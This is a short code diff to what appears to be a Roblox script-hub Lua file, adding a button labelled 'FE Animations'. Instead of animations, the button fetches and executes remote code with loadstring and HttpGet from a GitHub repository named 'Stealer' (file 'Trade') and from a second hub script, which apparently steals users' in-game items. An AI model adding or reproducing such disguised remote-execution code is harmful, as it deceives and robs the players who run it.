@@ -44,6 +44,15 @@ tab.newButton(
 )
 
 tab.newButton(
+    "FE Animations",
+    "Status: 🟢 This is keyless! ^^",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/Stealer/main/Trade"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
+    end
+)
+
+tab.newButton(
     "Movable Shiftlock",
     "Status: 🟢 Also working in any game!",
     function()
